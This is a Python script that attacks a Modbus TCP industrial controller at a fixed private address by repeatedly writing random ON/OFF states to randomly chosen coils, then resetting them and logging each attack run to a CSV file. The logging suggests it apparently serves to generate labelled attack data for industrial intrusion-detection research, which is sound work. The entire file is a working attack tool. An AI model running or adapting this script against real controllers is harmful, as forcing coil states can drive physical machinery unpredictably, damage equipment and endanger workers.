import time
import struct
import random
import argparse
import csv
import os
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from colorama import Fore, Style
from utils import read_memory, write_memory, get_enabled_coils, random_dict_from_list

parser = argparse.ArgumentParser(
    description="Coil Manipulator - Writes random ON/OFF states to random Modbus coils",
    usage="python3 coil_manipulator.py --duration <DURATION>"
)

parser.add_argument("--duration", help="Duration of the attack (0 = infinite)", type=int, required=False, default=0)

args = parser.parse_args()

# Connect to Modbus device
try:
    client = ModbusTcpClient(host="192.168.60.4", port=502)
    connection_status = client.connect()
    print(Fore.GREEN + "Connection successfully established" + Style.RESET_ALL)
except Exception as e:
    print(Fore.RED + "The IP address or the port is incorrect. Please check the configurations." + Style.RESET_ALL)
    exit(1)

# --- LOGGING SETUP ---
LOG_FILE = "log_cm_slitting_notching.csv"

# Define the CSV headers
csv_headers = [
    "id",
    "attack_type",
    "start_time",
    "end_time",
    "duration_seconds",
    "max_coils",
    "n_coils_manipulated",
    "manipulated_coils_list",
    "random_states",
    "cleanup_performed",
    "target_host"
]

# Record start time (human-readable and epoch)
start_time = time.time()
start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

max_coils = 110
n_coils = random.randint(1, max_coils)

total_coils_to_manipulate = [i for i in range(max_coils)]
random_dict = random_dict_from_list(total_coils_to_manipulate, n_coils)

# Set up duration
if args.duration > 0:
    end_time = start_time + args.duration
    infinite = False
else:
    infinite = True
    end_time = float('inf')

print(f"Attack running... Manipulating {n_coils} random coils. Press Ctrl+C to stop manually.")

# Track if cleanup was performed
cleanup_performed = False
attack_ended_by = "duration"

try:
    while time.time() < end_time:
        now = time.time()
        for coil, status in random_dict.items():
            client.write_coil(coil, bool(status))
    
    # Cleanup after normal completion
    for coil in range(1, max_coils):
        client.write_coil(coil, False)
    client.write_coil(0, True)
    cleanup_performed = True

except KeyboardInterrupt:
    print(Fore.CYAN + "\nAttack interrupted by user." + Style.RESET_ALL)
    attack_ended_by = "keyboard_interrupt"
    # Attempt cleanup even on interrupt
    try:
        for coil in range(1, max_coils):
            client.write_coil(coil, False)
        client.write_coil(0, True)
        cleanup_performed = True
        print(Fore.YELLOW + "Cleanup performed: coils reset to default state." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Cleanup failed: {e}" + Style.RESET_ALL)
finally:
    # Record end time
    end_time_actual = time.time()
    end_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    actual_duration = end_time_actual - start_time
    
    client.close()
    print(Fore.GREEN + "Connection closed." + Style.RESET_ALL)
    
    # --- LOGGING TO CSV ---
    # Generate a unique ID based on timestamp
    attack_id = datetime.now().strftime("%Y%m%d_%H%M%S") + f"_{random.randint(1000, 9999)}"
    
    # Convert random_dict to string representation for logging
    manipulated_coils = sorted(random_dict.keys())
    coil_states = {str(coil): int(status) for coil, status in random_dict.items()}
    
    # Prepare the row data
    log_row = {
        "id": attack_id,
        "attack_type": "coil_manipulation",
        "start_time": start_time_str,
        "end_time": end_time_str,
        "duration_seconds": f"{actual_duration:.2f}",
        "max_coils": max_coils,
        "n_coils_manipulated": n_coils,
        "manipulated_coils_list": str(manipulated_coils),
        "random_states": str(coil_states),
        "cleanup_performed": cleanup_performed,
        "target_host": "192.168.60.4:502"
    }
    
    # Check if file exists to determine if we need to write headers
    file_exists = os.path.isfile(LOG_FILE)
    
    try:
        with open(LOG_FILE, mode='a', newline='') as csv_file:
            writer = csv.DictWriter(csv_file, fieldnames=csv_headers)
            
            # Write header only if file is new
            if not file_exists:
                writer.writeheader()
            
            # Write the attack record
            writer.writerow(log_row)
        
        print(Fore.CYAN + f"Attack logged to {LOG_FILE} (ID: {attack_id})" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error writing to log file: {e}" + Style.RESET_ALL)